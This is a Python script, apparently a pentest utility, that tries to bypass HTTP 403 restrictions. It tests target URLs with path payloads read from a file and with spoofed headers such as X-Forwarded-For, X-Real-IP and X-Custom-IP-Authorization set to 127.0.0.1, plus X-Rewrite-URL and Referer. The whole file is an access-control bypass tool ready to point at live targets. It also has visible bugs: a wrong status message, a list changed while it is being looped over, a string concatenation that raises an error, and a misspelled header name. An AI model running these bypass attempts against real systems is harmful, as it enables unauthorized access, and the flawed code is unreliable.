import sys
import requests
import os
import urllib.parse


class Bypass():
    def __init__(self):
        # self.par = sys.argv[1]
        self.par = 'target.txt'
        self.target_list = []
        self.results = []
        self.basic_payload = []
        self.read_basic_payload()
        self.paser_par()
        self.check_status()
        self.basic_test()
        self.request_head()

    def read_basic_payload(self):
        try:
            with open("basic_payload.txt", 'r') as f:
                for x in f.readlines():
                    self.basic_payload.append(x.strip('\n').strip('/'))
        except FileNotFoundError as identifier:
            print(identifier)

    def paser_par(self):
        try:
            if os.path.isfile(self.par):
                with open(self.par, 'r', encoding='utf8') as f:
                    for x in f.readlines():
                        self.target_list.append(x.strip('\n').strip('/'))
            else:
                url_parser = urllib.parse.urlparse(self.par)
                if not url_parser.scheme or not url_parser.netloc:
                    sys.exit("paramter is not a url or file!")
                else:
                    self.target_list.append(self.par.strip('/'))
        except FileNotFoundError as identifier:
            print(identifier)

    def check_status(self):
        try:
            for url in self.target_list:
                req = requests.get(url=url, timeout=3)
                if req.status_code != 403:
                    print(url+"'s status code is not 404")
                    self.target_list.remove(url)
        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError) as identifier:
            print(identifier)

    def basic_test(self):
        for url in self.target_list:
            for payload in self.basic_payload:
                requ = requests.get(url=url + payload, timeout=3)
                if requ.status_code < 400:
                    self.results.append(url + payload)
                    # self.target_list.remove(url)
                    print("Bypass: " + url + payload)
                    # break

    def request_head(self):
        http_head = ['Referer', 'X-Origin-URL', 'X-Rewrite-URL', 'X-Real-IP', 'X-Forwarded-For', 'X-Custom-IP-Authorization']

        for url in self.target_list:
            parser_url = urllib.parse.urlparse(url)
            for head in http_head:
                if head == 'Referer':
                    header = {'Referer': url}
                    req_1 = requests.get(url=url + '/', timeout=3, headers=header)
                    # req_2 = requests.get(url=parser_url.scheme + "://" + parser_url.hostname + '/', headers=header, timeout=3)
                    if req_1.status_code < 400:
                        self.results.append("Bypass: " + url + '\n' + "Referer: " + url)
                        print("Bypass: " + url+'/')
                        print("Referer: " + url)
                        break
                elif head == 'X-Origin-URL' or head == 'X-Rewrite-URL':
                    header_origin = {'X-Origin-URL': parser_url.path}
                    header_rewrite = {'X-Rewrite-URL': parser_url.path}
                    # req_1 = requests.get(url=parser_url.scheme + "://" + parser_url.hostname + '/', headers=header_origin, timeout=3)
                    req_1 = requests.get(url=url + '/', headers=header_origin, timeout=3)
                    req_2 = requests.get(url=parser_url.scheme + "://" + parser_url.hostname + '/', headers=header_rewrite, timeout=3)
                    if req_1.status_code < 400:
                        self.results.append("Bypass: " + url + '\n' + "X-Origin-URL: " + parser_url.path)
                        print("Bypass: " + url + '\n' + "X-Origin-URL" + parser_url.path)
                    elif req_2.status_code < 400:
                        self.results.append("Bypass: " + url + '\n' + "X-Rewrite-URL: " + parser_url.path)
                        print("Bypass: " + url + '\n' + "X-Rewrite-URL: " + parser_url.path)
                else:
                    header_real = {'X-Real-IP': '127.0.0.1'}
                    header_forwarded = {'X-Forwarded-For': '127.0.0.1'}
                    header_custom = {'X-Custom-IP-Authorization': '127.0.0.1'}
                    headers = [header_real, header_forwarded, header_custom]
                    for header in headers:
                        req = requests.get(url=url + '/', headers=header, timeout=3)
                        if req.status_code < 400:
                            self.results.append("Bypass" + url + '\n' + header.keys() + ': 127.0.0.1')


if __name__ == '__main__':
    a = Bypass()
